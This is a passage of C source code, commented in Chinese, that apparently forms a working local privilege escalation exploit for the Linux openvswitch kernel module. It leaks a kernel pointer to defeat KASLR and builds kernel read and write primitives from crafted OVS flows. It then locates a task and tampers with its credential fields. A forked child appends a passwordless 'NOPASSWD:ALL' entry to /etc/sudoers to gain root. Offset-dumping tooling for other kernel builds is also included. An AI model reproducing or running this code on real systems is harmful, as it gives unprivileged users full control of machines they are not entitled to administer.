    struct buf key, actions;
    int nc, i;
    int ret = -EINVAL;
    uint64_t tun_dst = addr - (uint64_t)w->k->dst_entry_ref;

    nc = (w->carrier_mode == CARRIER_LABELS_ONLY) ? 1
       : (w->carrier_mode == CARRIER_TIMEOUT) ? 1 : 2;

    for (i = 0; i < nc; i++) {
        int carrier;

        if (w->carrier_mode == CARRIER_AUTO)
            carrier = (i == 0) ? CARRIER_TIMEOUT : CARRIER_LABELS_ONLY;
        else
            carrier = w->carrier_mode;

        buf_init(&key, 256);
        buf_init(&actions, 32768);
        if (!key.p || !actions.p) {
            buf_free(&key);
            buf_free(&actions);
            return -ENOMEM;
        }

        flow_key(&key, ++w->seq);
        clone_with_fake_set(&actions, carrier, tun_dst,
                            w->ct_action_len, w->labels_off);

        ret = ovs_create_flow(w->g, w->flow_family, w->dp_ifindex, &key, &actions);
        if (ret == 0) {
            ret = ovs_delete_flow(w->g, w->flow_family, w->dp_ifindex, &key);
            buf_free(&key);
            buf_free(&actions);
            return ret;
        }
        ovs_delete_flow(w->g, w->flow_family, w->dp_ifindex, &key);
        buf_free(&key);
        buf_free(&actions);

        if (ret == -ENOMEM) {
            pr_err("    内存不足：建议重启后重试，或给虚拟机 2GB 以上内存\n");
            return ret;
        }
        if (fake_set_error(ret) && i + 1 < nc)
            continue;
        if (fake_set_error(ret))
            return ret;
        return ret;
    }
    return ret;
}

/* -------------------------------------------------------------------------
 * 指针 / XArray
 * ---------------------------------------------------------------------- */

static uint64_t canonicalize(uint64_t v)
{
    if (v >= 0xFFFF800000000000ULL)
        return v;
    if (v >= 0x0000008000000000ULL && v <= 0x000000FFFFFFFFFFULL)
        return v | 0xFFFFFF0000000000ULL;
    if (v >= 0x0000800000000000ULL && v <= 0x0000FFFFFFFFFFFFULL)
        return v | 0xFFFF000000000000ULL;
    if (v >= 0x0080000000000000ULL && v <= 0x00FFFFFFFFFFFFFFULL)
        return v | 0xFF00000000000000ULL;
    return v;
}

static int is_kernel_ptr(uint64_t v)
{
    uint64_t c = canonicalize(v);

    return c >= 0xFF00000000000000ULL && c <= 0xFFFFFFFFFFFFFFFFULL &&
           (c & 7) == 0;
}

static int read_kptr(struct reader *r, uint64_t addr, const char *label,
                     uint64_t *out)
{
    uint64_t v = 0;

    if (ovs_read_u64(r, addr, &v) != 0) {
        pr_err("  读 %s @0x%llx 失败\n", label, (unsigned long long)addr);
        return -1;
    }
    v = canonicalize(v);
    if (!is_kernel_ptr(v)) {
        pr_err("  %s @0x%llx 不是内核指针: 0x%llx\n", label,
               (unsigned long long)addr, (unsigned long long)v);
        return -1;
    }
    *out = v;
    return 0;
}

static int xarray_entry_to_node(uint64_t e, uint64_t *out)
{
    if (e == 0 || (e & 3) != 2)
        return 0;
    e = canonicalize(e & ~3ULL);
    if (!is_kernel_ptr(e))
        return 0;
    *out = e;
    return 1;
}

static int xarray_entry_to_ptr(uint64_t e, uint64_t *out)
{
    if (e == 0 || (e & 3) != 0)
        return 0;
    e = canonicalize(e);
    if (!is_kernel_ptr(e))
        return 0;
    *out = e;
    return 1;
}

static int read_xarray_entry(struct reader *r, uint64_t addr, const char *label,
                             uint64_t *out)
{
    uint64_t v = 0, p = 0;

    if (ovs_read_u64(r, addr, &v) != 0)
        return -1;
    if (xarray_entry_to_node(v, &p)) {
        *out = p | 2;
        return 0;
    }
    if (xarray_entry_to_ptr(v, &p)) {
        *out = p;
        return 0;
    }
    pr_err("  %s @0x%llx 不是合法 XArray 项: 0x%llx\n", label,
           (unsigned long long)addr, (unsigned long long)v);
    return -1;
}

static int lookup_init_pid_ns_pid(struct reader *r, uint64_t kernel_base,
                                  int pid_nr, uint64_t *out)
{
    const struct koffs *k = r->k;
    uint64_t idr_addr = kernel_base + k->vmlinux_init_pid_ns + k->pid_namespace_idr;
    uint32_t idr_base = 0;
    uint64_t xarray_addr, entry;
    unsigned long index;
    int depth;

    if (ovs_read_u32(r, idr_addr + k->idr_base, &idr_base) != 0)
        return -1;
    if ((uint32_t)pid_nr < idr_base) {
        pr_err("  pid %d 小于 init_pid_ns.idr_base %u\n", pid_nr, idr_base);
        return -1;
    }
    index = (unsigned long)((uint32_t)pid_nr - idr_base);
    xarray_addr = idr_addr + k->idr_idr_rt;

    if (read_xarray_entry(r, xarray_addr + k->xarray_xa_head,
                          "init_pid_ns.idr.xa_head", &entry) != 0)
        return -1;

    for (depth = 0; depth < 8; depth++) {
        uint64_t node = 0, ptr = 0;

        if (xarray_entry_to_node(entry, &node)) {
            int shift = 0;
            unsigned slot;
            uint64_t slot_addr;

            if (ovs_read_u8(r, node + k->xa_node_shift, &shift) != 0)
                return -1;
            shift &= 0xff;
            if (shift > 60 || shift % 6 != 0) {
                pr_err("  xa_node.shift 异常: %u\n", shift);
                return -1;
            }
            slot = (unsigned)((index >> shift) & 0x3F);
            slot_addr = node + k->xa_node_slots + (uint64_t)slot * 8;
            if (read_xarray_entry(r, slot_addr, "idr slot", &entry) != 0)
                return -1;
            continue;
        }
        if (xarray_entry_to_ptr(entry, &ptr)) {
            *out = ptr;
            return 0;
        }
        break;
    }
    pr_err("  init_pid_ns idr 遍历超过深度限制（pid %d）\n", pid_nr);
    return -1;
}

static int locate_task(struct reader *r, uint64_t kernel_base, int wanted_pid,
                       uint64_t *out)
{
    const struct koffs *k = r->k;
    uint64_t pid_struct = 0, first = 0, task = 0;
    uint32_t pid = 0;

    if (lookup_init_pid_ns_pid(r, kernel_base, wanted_pid, &pid_struct) != 0)
        return -1;

    if (read_kptr(r, pid_struct + k->pid_tasks + k->hlist_head_first,
                  "pid.tasks.first", &first) != 0)
        return -1;

    task = first - (uint64_t)k->task_pid_links;
    if (!is_kernel_ptr(task)) {
        pr_err("  hlist 指出的 task 非法: 0x%llx\n", (unsigned long long)task);
        return -1;
    }
    if (ovs_read_u32(r, task + k->task_pid, &pid) != 0)
        return -1;
    if ((int)pid != wanted_pid) {
        pr_err("  task.pid=%u，期望 %d\n", pid, wanted_pid);
        return -1;
    }
    pr_dim("  pid_struct=0x%llx task=0x%llx\n",
           (unsigned long long)pid_struct, (unsigned long long)task);
    *out = task;
    return 0;
}

/* -------------------------------------------------------------------------
 * 改 writer 的 cred
 * ---------------------------------------------------------------------- */

static int decrement_to_zero(struct reader *r, struct writer *w, uint64_t addr,
                             const char *label)
{
    uint32_t v = 0, now = 0;
    uint32_t i;

    if (ovs_read_u32(r, addr, &v) != 0)
        return -1;
    pr_dim("  %s before=%u\n", label, v);
    if (v > 100000) {
        pr_err("  %s 的值 %u 异常偏大\n", label, v);
        return -1;
    }
    for (i = 0; i < v; i++) {
        if (decrement_once(w, addr) != 0) {
            pr_err("  %s 递减到 %u/%u 时失败\n", label, i, v);
            return -1;
        }
        if (i && i % 250 == 0)
            pr_dim("  %s: %u/%u\n", label, i, v);
    }
    sleep(2);
    if (ovs_read_u32(r, addr, &now) != 0)
        return -1;
    if (now != 0) {
        pr_err("  %s 没有归零，当前 %u\n", label, now);
        return -1;
    }
    pr_ok("  %s 已归零\n", label);
    return 0;
}

static int zero_to_all_ones(struct reader *r, struct writer *w, uint64_t addr,
                            const char *label)
{
    uint32_t v = 0;

    if (ovs_read_u32(r, addr, &v) != 0)
        return -1;
    pr_dim("  %s before=0x%08x\n", label, v);
    if (v != 0) {
        pr_err("  %s 不是 0（0x%08x），旧内核 __refcnt 路径不适用\n", label, v);
        return -1;
    }
    if (decrement_once(w, addr) != 0)
        return -1;
    usleep(500 * 1000);
    if (ovs_read_u32(r, addr, &v) != 0)
        return -1;
    if (v != 0xFFFFFFFFu) {
        pr_err("  %s 没有回绕到 0xffffffff，当前 0x%08x\n", label, v);
        return -1;
    }
    pr_ok("  %s 已回绕为 0xffffffff\n", label);
    return 0;
}

static int panic_on_warn(void)
{
    char b[32] = { 0 };
    FILE *f = fopen("/proc/sys/kernel/panic_on_warn", "r");

    if (!f)
        return 0;
    if (!fgets(b, sizeof(b), f)) {
        fclose(f);
        return 0;
    }
    fclose(f);
    return b[0] != '0' && b[0] != '\n' && b[0] != '\0';
}

/* -------------------------------------------------------------------------
 * host 侧：sudoers 写入子进程
 * ---------------------------------------------------------------------- */

struct host_user {
    uid_t uid;
    gid_t gid;
    char name[64];
};

static int read_self_status_cap(uint64_t *cap)
{
    FILE *f = fopen("/proc/self/status", "r");
    char line[256];

    if (!f)
        return -1;
    while (fgets(line, sizeof(line), f)) {
        if (!strncmp(line, "CapEff:", 7)) {
            fclose(f);
            *cap = strtoull(line + 7, NULL, 16);
            return 0;
        }
    }
    fclose(f);
    return -1;
}

static int check_launch_user(struct host_user *u)
{
    uint64_t cap = 0;

    u->uid = getuid();
    u->gid = getgid();
    if (u->uid == 0) {
        pr_err("当前是 root。这个 PoC 要在普通用户下跑，root 没有提权意义。\n");
        pr_dim("    用 su <普通用户> 切过去再运行。\n");
        return -1;
    }
    if (read_self_status_cap(&cap) == 0 && cap != 0) {
        pr_err("当前进程已经带有 capability（CapEff=0x%llx），不是干净起点。\n",
               (unsigned long long)cap);
        return -1;
    }
    {
        struct passwd *pw = getpwuid(u->uid);

        if (pw && pw->pw_name)
            snprintf(u->name, sizeof(u->name), "%s", pw->pw_name);
        else
            snprintf(u->name, sizeof(u->name), "uid%u", (unsigned)u->uid);
    }
    return u->name[0] ? 0 : -1;
}

static int sudo_works(void)
{
    char out[256];

    run_cmd("sudo -n true 2>&1", out, sizeof(out));
    return WEXITSTATUS(0) == 0 && out[0] == '\0';
}

static int sudoers_has_dropin(const char *line)
{
    return line && (!strncmp(line, "#includedir", 11) ||
                    !strncmp(line, "@includedir", 11));
}

static int write_sudoers_dropin(const char *path, const char *user)
{
    char content[256];
    int fd;

    snprintf(content, sizeof(content), "%s ALL=(ALL) NOPASSWD:ALL\n", user);
    mkdir("/etc/sudoers.d", 0755);
    fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0440);
    if (fd < 0)
        return -1;
    if (write(fd, content, strlen(content)) != (ssize_t)strlen(content)) {
        close(fd);
        return -1;
    }
    fchmod(fd, 0440);
    fsync(fd);
    close(fd);
    sync();
    return 0;
}

static int append_main_sudoers(const char *user)
{
    char content[256];
    int fd;

    snprintf(content, sizeof(content), "\n%s ALL=(ALL:ALL) NOPASSWD:ALL\n", user);
    fd = open("/etc/sudoers", O_WRONLY | O_APPEND);
    if (fd < 0)
        return -1;
    if (write(fd, content, strlen(content)) != (ssize_t)strlen(content)) {
        close(fd);
        return -1;
    }
    fsync(fd);
    close(fd);
    sync();
    return 0;
}

static int write_sudoers_entry(const char *dropin_path, const char *user,
                               char *used, size_t usedlen)
{
    FILE *f = fopen("/etc/sudoers", "r");
    int has_dropin = 0;

    if (f) {
        char line[512];

        while (fgets(line, sizeof(line), f)) {
            if (sudoers_has_dropin(line) && strstr(line, "/etc/sudoers.d")) {
                has_dropin = 1;
                break;
            }
        }
        fclose(f);
    }

    if (has_dropin && write_sudoers_dropin(dropin_path, user) == 0) {
        snprintf(used, usedlen, "%s", dropin_path);
        return 0;
    }
    if (append_main_sudoers(user) == 0) {
        snprintf(used, usedlen, "%s", "/etc/sudoers");
        return 0;
    }
    return -1;
}

static void sleep_forever_detached(void)
{
    setsid();
    {
        int fd = open("/dev/null", O_RDWR);

        if (fd >= 0) {
            dup2(fd, 0);
            dup2(fd, 1);
            dup2(fd, 2);
            if (fd > 2)
                close(fd);
        }
    }
    for (;;)
        sleep(3600);
}

/*
 * fork 出 host 侧的 sudoers writer。
 * 它一直等到 pipe 上出现 '1'，才把 cred 切到 0（内存已经被改过），
 * 写 sudoers，然后挂起不退 —— 保持进程存在，避免 OVS 里的
 * fake dst_entry 被释放回到 netns 重建路径上。
 */
static pid_t fork_sudoers_writer(const char *dropin, const char *user,
                                 int *trig_out, int *ack_out)
{
    int tr[2], ak[2];
    pid_t pid;

    if (pipe(tr) != 0 || pipe(ak) != 0)
        return -1;

    pid = fork();
    if (pid < 0)
        return -1;

    if (pid == 0) {
        char token = 0;
        char used[512] = "";
        char ack[600];
        int ok;

        close(tr[1]);
        close(ak[0]);

        if (read(tr[0], &token, 1) != 1 || token != '1') {
            close(tr[0]);
            close(ak[1]);
            _exit(1);
        }

        if (setresgid(0, 0, 0) != 0 || setresuid(0, 0, 0) != 0)
            pr_dim("  writer: setresuid 未生效（依赖内存里已改好的 fsuid）\n");

        ok = write_sudoers_entry(dropin, user, used, sizeof(used)) == 0;
        snprintf(ack, sizeof(ack), ok ? "1 %s\n" : "0\n", used);
        (void)!write(ak[1], ack, strlen(ack));
        close(tr[0]);
        close(ak[1]);

        if (ok)
            sleep_forever_detached();
        _exit(0);
    }

    close(tr[0]);
    close(ak[1]);
    *trig_out = tr[1];
    *ack_out = ak[0];
    pr_dim("  host sudoers writer pid=%d\n", (int)pid);
    return pid;
}

/* -------------------------------------------------------------------------
 * namespace
 * ---------------------------------------------------------------------- */

static int write_map(const char *path, const char *text)
{
    int fd = open(path, O_WRONLY);
    ssize_t n;

    if (fd < 0)
        return -1;
    n = write(fd, text, strlen(text));
    close(fd);
    return n == (ssize_t)strlen(text) ? 0 : -1;
}

static int enter_private_ns(uid_t uid, gid_t gid)
{
    char map[64];

    if (unshare(CLONE_NEWUSER) != 0) {
        pr_err("unshare(CLONE_NEWUSER) 失败: %s\n", strerror(errno));
        pr_dim("    需要 kernel.unprivileged_userns_clone=1（Ubuntu 20.04 默认允许）\n");
        return -1;
    }
    /* 阻止 setgroups，否则 gid_map 写不进去 */
    write_map("/proc/self/setgroups", "deny");

    snprintf(map, sizeof(map), "0 %u 1\n", (unsigned)uid);
    if (write_map("/proc/self/uid_map", map) != 0) {
        pr_err("写 uid_map 失败: %s\n", strerror(errno));
        return -1;
    }
    snprintf(map, sizeof(map), "0 %u 1\n", (unsigned)gid);
    if (write_map("/proc/self/gid_map", map) != 0) {
        pr_err("写 gid_map 失败: %s\n", strerror(errno));
        return -1;
    }

    if (unshare(CLONE_NEWNET) != 0) {
        pr_err("unshare(CLONE_NEWNET) 失败: %s\n", strerror(errno));
        return -1;
    }
    if (setresgid(0, 0, 0) != 0 || setresuid(0, 0, 0) != 0) {
        pr_err("进入 userns 后切换到 uid 0 失败: %s\n", strerror(errno));
        return -1;
    }
    return 0;
}

/* -------------------------------------------------------------------------
 * 从泄漏的 fake OUTPUT 里找 nf_conntrack_helper*
 * ---------------------------------------------------------------------- */

static int find_helper_pointer(const struct buf *actions, uint64_t *out)
{
    size_t off = 0;
    struct attr top;

    while (attr_next(actions->p, actions->len, &off, &top) == 0) {
        size_t i;
        uint64_t first = 0;

        if (top.type != OVS_ACTION_ATTR_OUTPUT || top.raw_len != 512)
            continue;

        for (i = 0; i + 8 <= top.len; i++) {
            uint64_t v;

            memcpy(&v, top.payload + i, 8);
            if (v < 0xFFFF800000000000ULL)
                continue;
            if (v >= 0xFFFFFFFFC0000000ULL && v <= 0xFFFFFFFFDFFFFFFFULL &&
                (v & 7) == 0) {
                *out = v;
                return 0;
            }
            if (!first)
                first = v;
        }
        if (first) {
            *out = first;
            return 0;
        }
    }
    return -1;
}

static int valid_vmlinux_base(uint64_t v)
{
    return v >= 0xFFFFFFFF80000000ULL && v <= 0xFFFFFFFFF0000000ULL &&
           (v % 0x200000ULL) == 0;
}

static int derive_helper_module_ktype(struct reader *r, uint64_t helper_me,
                                      uint64_t helper_ptr, uint64_t *out)
{
    uint64_t module_ptr = 0, ktype = 0;
    uint64_t ktype_addr;

    if (ovs_read_u64(r, helper_me, &module_ptr) != 0) {
        pr_err("  读 helper->me 失败\n");
        return -1;
    }
    module_ptr = canonicalize(module_ptr);

    if (!is_kernel_ptr(module_ptr) ||
        module_ptr < helper_ptr - 0x800000ULL ||
        module_ptr > helper_ptr + 0x800000ULL) {
        pr_err("  helper->me 读出来不是附近的 module 指针: "
               "helper=0x%llx me=0x%llx\n",
               (unsigned long long)helper_ptr,
               (unsigned long long)module_ptr);
        return -1;
    }

    ktype_addr = module_ptr + (uint64_t)r->k->module_kobj_ktype;
    if (ovs_read_u64(r, ktype_addr, &ktype) != 0)
        return -1;
    ktype = canonicalize(ktype);

    if (!valid_vmlinux_base(ktype - r->k->vmlinux_module_ktype)) {
        pr_err("  module.kobj.ktype @0x%llx = 0x%llx，与 vmlinux 符号偏移对不上\n",
               (unsigned long long)ktype_addr, (unsigned long long)ktype);
        return -1;
    }
    pr_dim("  helper->me = 0x%llx（已验证）\n", (unsigned long long)module_ptr);
    *out = ktype;
    return 0;
}

/* -------------------------------------------------------------------------
 * 建立整套原语
 * ---------------------------------------------------------------------- */

struct prim {
    struct genl g;
    struct koffs k;
    struct reader r;
    struct writer w;
    int dp_family;
    int flow_family;
    int dp_ifindex;
    uint64_t helper_ptr;
    uint64_t module_ktype;
    uint64_t kernel_base;
};

static int setup_primitives(struct prim *p, const char *dp_name, int verbose)
{
    struct buf key, actions, leaked;
    unsigned char fake_output[8] = { 0, 2, OVS_ACTION_ATTR_OUTPUT, 0, 0, 0, 0, 0 };
    int ret;

    memset(p, 0, sizeof(*p));

    if (genl_open(&p->g) != 0) {
        pr_err("打开 NETLINK_GENERIC 失败: %s\n", strerror(errno));
        return -1;
    }

    ret = genl_get_family(&p->g, "ovs_datapath", &p->dp_family);
    if (ret < 0) {
        pr_err("找不到 ovs_datapath 这个 generic netlink family（%s）\n",
               strerror(-ret));
        pr_dim("    说明 openvswitch 模块没加载。先执行:\n"
               "      sudo modprobe openvswitch\n"
               "    然后重跑。（Ubuntu 需要装 linux-modules-extra 或 openvswitch 包）\n");
        return -1;
    }
    ret = genl_get_family(&p->g, "ovs_flow", &p->flow_family);
    if (ret < 0) {
        pr_err("找不到 ovs_flow family（%s）\n", strerror(-ret));
        return -1;
    }

    ret = ovs_create_datapath(&p->g, p->dp_family, dp_name);
    if (ret < 0) {
        pr_err("创建 datapath %s 失败: %s\n", dp_name, strerror(-ret));
        return -1;
    }
    p->dp_ifindex = if_nametoindex(dp_name);
    if (p->dp_ifindex <= 0) {
        pr_err("datapath %s 建好了但拿不到 ifindex\n", dp_name);
        return -1;
    }
    pr_dim("  datapath %s ifindex=%d\n", dp_name, p->dp_ifindex);

    if (derive_offsets(&p->k) != 0) {
        pr_err("内核偏移推导失败\n");
        return -1;
    }

    /*
     * 先用 helper 泄漏拿一个 nf_conntrack_helper 指针。
     * fake OUTPUT 的 nlattr 头是 len=512, type=OUTPUT；
     * 后面的 400 个 CT{COMMIT,HELPER} 让解析器越界读到它。
     */
    buf_init(&key, 256);
    buf_init(&actions, 32768);
    buf_init(&leaked, 65536);
    if (!key.p || !actions.p || !leaked.p) {
        buf_free(&key); buf_free(&actions); buf_free(&leaked);
        return -1;
    }

    /* fake_output 的前两个字节是 len=0x0200(512) */
    fake_output[0] = 0x00;
    fake_output[1] = 0x02;

    flow_key(&key, 1);
    clone_with_helper_leak(&actions, fake_output, sizeof(fake_output));
    ret = ovs_create_flow(&p->g, p->flow_family, p->dp_ifindex, &key, &actions);
    if (ret < 0) {
        pr_err("建 helper 泄漏 flow 失败: %s\n", strerror(-ret));
        buf_free(&key); buf_free(&actions); buf_free(&leaked);
        return -1;
    }
    ret = ovs_get_actions(&p->g, p->flow_family, p->dp_ifindex, &key, &leaked);
    ovs_delete_flow(&p->g, p->flow_family, p->dp_ifindex, &key);
    buf_free(&key);
    buf_free(&actions);
    if (ret < 0) {
        pr_err("读回 helper 泄漏 flow 失败: %s\n", strerror(-ret));
        buf_free(&leaked);
        return -1;
    }

    if (find_helper_pointer(&leaked, &p->helper_ptr) != 0) {
        buf_free(&leaked);
        pr_err("泄漏的 OUTPUT 里没有内核指针——这条链在这个内核上可能已修\n");
        return -1;
    }
    buf_free(&leaked);
    pr_dim("  泄漏到 helper 指针 0x%llx\n", (unsigned long long)p->helper_ptr);

    /* reader / writer */
    memset(&p->r, 0, sizeof(p->r));
    p->r.g = &p->g;
    p->r.flow_family = p->flow_family;
    p->r.dp_ifindex = p->dp_ifindex;
    p->r.k = &p->k;
    p->r.seq = 1000;
    p->r.carrier_mode = g_krec_hit.hit ? g_krec_hit.read_carrier : CARRIER_AUTO;
    p->r.ct_action_len = p->k.ovs_ct_action_len;
    p->r.labels_off = p->k.ovs_ct_labels;
    build_lanes(&p->k, p->r.lanes);

    memset(&p->w, 0, sizeof(p->w));
    p->w.g = &p->g;
    p->w.flow_family = p->flow_family;
    p->w.dp_ifindex = p->dp_ifindex;
    p->w.k = &p->k;
    p->w.seq = 100000000;
    p->w.carrier_mode = g_krec_hit.hit ? g_krec_hit.write_carrier : CARRIER_AUTO;
    p->w.ct_action_len = p->k.ovs_ct_action_len;
    p->w.labels_off = p->k.ovs_ct_labels;

    if (verbose)
        pr_dim("  ct_action_len=%d labels_off=%d dst_ref_kind=%s\n",
               p->k.ovs_ct_action_len, p->k.ovs_ct_labels,
               p->k.ref_kind == 0 ? "__rcuref" : "__refcnt");

    if (derive_helper_module_ktype(&p->r,
                                   p->helper_ptr + (uint64_t)p->k.nf_conntrack_helper_me,
                                   p->helper_ptr, &p->module_ktype) != 0)
        return -1;

    p->kernel_base = p->module_ktype - p->k.vmlinux_module_ktype;
    pr_dim("  module_ktype=0x%llx kernel_base=0x%llx\n",
           (unsigned long long)p->module_ktype,
           (unsigned long long)p->kernel_base);
    return 0;
}

/* -------------------------------------------------------------------------
 * -dump-krec：把本机推导出的偏移打成一条记录，喂给 tools/mk_offset.py
 * ---------------------------------------------------------------------- */

static const char *g_dump_carrier = "timeout";
static const char *g_dump_wcarrier;
static const char *g_dump_from;
static int g_dump_tunnel_info = 31;
static int g_dump_lanes[N_LANES];
static int g_dump_lane_count;
static int g_dump_carrier_set, g_dump_lanes_set, g_dump_ti_set;
static int g_dump_target;      /* -dump-target：输出 target.h 而不是 JSON */

/* -------------------------------------------------------------------------
 * -dump-target：输出一张可直接放进 offset/ 的 target.h
 * ---------------------------------------------------------------------- */

static void print_target(const struct koffs *k, const struct utsname *u)
{
    char ts[64];
    time_t now = time(NULL);
    struct tm *tm = localtime(&now);
    int i;

    if (!tm || !strftime(ts, sizeof(ts), "%Y-%m-%d %H:%M:%S", tm))
        snprintf(ts, sizeof(ts), "unknown");

    printf("/*\n"
           " * target.h - dirtychains OVS (CVE-2026-64531) kernel offsets\n"
           " *\n"
           " * 放这里：offset/<N>系/<release>/target.h\n"
           " * 例：    offset/5系/5.8.0-59-generic/target.h\n"
           " *\n"
           " * 程序启动时按目录名找本机 release，不需要重新编译。\n"
           " * 本文件同时也是合法 C 头文件，可以直接 #include 静态编译。\n"
           " *\n"
           " * 生成: ovswrap -dump-target    %s\n"
           " */\n"
           "#ifndef DIRTYFRAG_TARGET_H\n"
           "#define DIRTYFRAG_TARGET_H\n\n", ts);
    printf("#define KREC_FORMAT        1\n");
    printf("#define KREC_RELEASE       \"%s\"\n", u->release);
    printf("#define KREC_VERSION       \"%s\"\n", u->version);
    printf("#define KREC_VERSION_HASH  %luUL\n", fnv1a32(u->version));
    printf("#define KREC_MACHINE       \"%s\"\n\n", u->machine);

    printf("/* 符号偏移：相对 _text，与 KASLR 无关 */\n");
    printf("#define KREC_VMLINUX_MODULE_KTYPE %luUL\n", k->vmlinux_module_ktype);
    printf("#define KREC_VMLINUX_INIT_PID_NS  %luUL\n\n", k->vmlinux_init_pid_ns);

    printf("/* 结构体字段偏移 */\n");
#define TH_OUT(n, f) printf("#define %-30s %d\n", "KREC_" #n, k->f)
    TH_OUT(NF_CONNTRACK_HELPER_ME, nf_conntrack_helper_me);
    TH_OUT(MODULE_KOBJ_KTYPE, module_kobj_ktype);
    TH_OUT(TASK_PID, task_pid);
    TH_OUT(TASK_CRED, task_cred);
    TH_OUT(TASK_PID_LINKS, task_pid_links);
    TH_OUT(CRED_FSUID, cred_fsuid);
    TH_OUT(CRED_FSGID, cred_fsgid);
    TH_OUT(CRED_CAP_PERMITTED, cred_cap_permitted);
    TH_OUT(CRED_CAP_EFFECTIVE, cred_cap_effective);
    TH_OUT(PID_NAMESPACE_IDR, pid_namespace_idr);
    TH_OUT(IDR_IDR_RT, idr_idr_rt);
    TH_OUT(IDR_BASE, idr_base);
    TH_OUT(XARRAY_XA_HEAD, xarray_xa_head);
    TH_OUT(XA_NODE_SHIFT, xa_node_shift);
    TH_OUT(XA_NODE_SLOTS, xa_node_slots);
    TH_OUT(PID_TASKS, pid_tasks);
    TH_OUT(HLIST_HEAD_FIRST, hlist_head_first);
    TH_OUT(DST_ENTRY_REF, dst_entry_ref);
    TH_OUT(METADATA_DST_TUN_INFO, metadata_dst_tun_info);
    TH_OUT(IP_TUNNEL_KEY_IPV4_SRC, ip_tunnel_key_ipv4_src);
    TH_OUT(IP_TUNNEL_KEY_IPV4_DST, ip_tunnel_key_ipv4_dst);
    TH_OUT(IP_TUNNEL_KEY_TOS, ip_tunnel_key_tos);
    TH_OUT(IP_TUNNEL_KEY_TTL, ip_tunnel_key_ttl);
    TH_OUT(IP_TUNNEL_KEY_TP_SRC, ip_tunnel_key_tp_src);
    TH_OUT(IP_TUNNEL_KEY_TP_DST, ip_tunnel_key_tp_dst);
    TH_OUT(OVS_CT_LABELS, ovs_ct_labels);
    TH_OUT(OVS_CT_ACTION_LEN, ovs_ct_action_len);
#undef TH_OUT

    printf("\n/* 行为参数：从调试信息推不出来，只能实机试 */\n");
    printf("#define KREC_REF_KIND      \"%s\"\n",
           k->ref_kind ? "__refcnt" : "__rcuref");
    printf("#define KREC_TUNNEL_INFO   %d\n", g_dump_tunnel_info);
    printf("#define KREC_READ_CARRIER  \"%s\"\n", g_dump_carrier);
    printf("#define KREC_WRITE_CARRIER \"%s\"\n",
           g_dump_wcarrier ? g_dump_wcarrier : g_dump_carrier);
    printf("#define KREC_READ_LANES    \"");
    for (i = 0; i < g_dump_lane_count; i++)
        printf("%s%s", i ? "," : "", krec_lane_names[g_dump_lanes[i]]);
    printf("\"\n\n#endif /* DIRTYFRAG_TARGET_H */\n");

    {
        char major[8] = "?";

        th_major(u->release, major, sizeof(major));
        fprintf(stderr, "\n放到 offset/%s系/%s/target.h 即可（目录名 = uname -r）。\n",
                major, u->release);
    }
}

static void json_escape(const char *s)
{
    putchar('"');
    for (; *s; s++) {
        unsigned char c = (unsigned char)*s;

        if (c == '"' || c == '\\')
            printf("\\%c", c);
        else if (c < 0x20)
            printf("\\u%04x", c);
        else
            putchar(c);
    }
    putchar('"');
}

static int dump_lane_id(const char *name, size_t len)
{
    int i;

    for (i = 0; i < N_LANES; i++)
        if (strlen(krec_lane_names[i]) == len &&
            !strncmp(krec_lane_names[i], name, len))
            return i;
    return -1;
}

/* "-lanes ttl,tos,tp_src_0" -> 下标数组 */
static int parse_dump_lanes(const char *arg)
{
    g_dump_lane_count = 0;
    while (*arg) {
        const char *comma = strchr(arg, ',');
        size_t len = comma ? (size_t)(comma - arg) : strlen(arg);
        int id = dump_lane_id(arg, len);

        if (id < 0) {
            fprintf(stderr, "未知 lane: %.*s\n", (int)len, arg);
            return -1;
        }
        if (g_dump_lane_count < N_LANES)
            g_dump_lanes[g_dump_lane_count++] = id;
        if (!comma)
            break;
        arg = comma + 1;
    }
    return 0;
}

static int do_dump_krec(void)
{
    struct koffs k;
    struct utsname u;
    int saved, rc, i;

    if (uname(&u) != 0) {
        fprintf(stderr, "uname 失败: %s\n", strerror(errno));
        return 1;
    }

    if (g_dump_from) {
        /* 从 offset/ 里抄一条：没有 BTF / pahole 时也能造出记录骨架 */
        const char *saved_force = g_krec_force;

        /* th_resolve 的诊断走 stderr，stdout 只留 JSON */
        fflush(stdout);
        saved = dup(STDOUT_FILENO);
        if (saved >= 0)
            dup2(STDERR_FILENO, STDOUT_FILENO);
        g_krec_force = g_dump_from;
        rc = th_resolve(&k);
        g_krec_force = saved_force;
        fflush(stdout);
        if (saved >= 0) {
            dup2(saved, STDOUT_FILENO);
            close(saved);
        }
        if (rc != 0) {
            fprintf(stderr, "offset/ 里没有 release=%s 的 target.h\n",
                    g_dump_from);
            return 1;
        }

        /* 没显式指定的行为参数沿用被抄的那条 */
        if (!g_dump_carrier_set) {
            g_dump_carrier = g_krec_hit.read_carrier ? "labels-only" : "timeout";
            g_dump_wcarrier = g_krec_hit.write_carrier ? "labels-only" : "timeout";
        }
        if (!g_dump_lanes_set) {
            g_dump_lane_count = g_krec_hit.lane_count;
            memcpy(g_dump_lanes, g_krec_hit.lane_order,
                   sizeof(g_dump_lanes[0]) * (size_t)g_dump_lane_count);
        }
        if (!g_dump_ti_set)
            g_dump_tunnel_info = g_krec_hit.tunnel_info;

        fprintf(stderr, "注意：偏移抄自 %s，不是本机推导。\n", g_dump_from);
    } else {
        /* 推导过程的中文诊断全部导到 stderr，stdout 只留 JSON */
        fflush(stdout);
        saved = dup(STDOUT_FILENO);
        if (saved >= 0)
            dup2(STDERR_FILENO, STDOUT_FILENO);
        g_force_derive = 1;
        rc = derive_offsets(&k);
        fflush(stdout);
        if (saved >= 0) {
            dup2(saved, STDOUT_FILENO);
            close(saved);
        }
        if (rc != 0) {
            fprintf(stderr, "\n推导失败。需要 pahole（sudo apt install dwarves）"
                            "和符号表：\n"
                            "  /boot/System.map-%s，或 root 读 /proc/kallsyms。\n"
                            "如果卡在 ovs_conntrack_info：先 sudo modprobe "
                            "openvswitch 再试。\n", u.release);
            return 1;
        }
    }

    if (!g_dump_lane_count) {          /* 没指定就按默认全量顺序 */
        for (i = 0; i < N_LANES; i++)
            g_dump_lanes[i] = i;
        g_dump_lane_count = N_LANES;
    }
    if (g_dump_target) {
        print_target(&k, &u);
        return 0;
    }

    printf("{\n  \"release\": ");
    json_escape(u.release);
    printf(",\n  \"version\": ");
    json_escape(u.version);
    printf(",\n  \"machine\": ");
    json_escape(u.machine);
    printf(",\n  \"offsets\": {\n");

#define KREC_JSON_INT(name) \
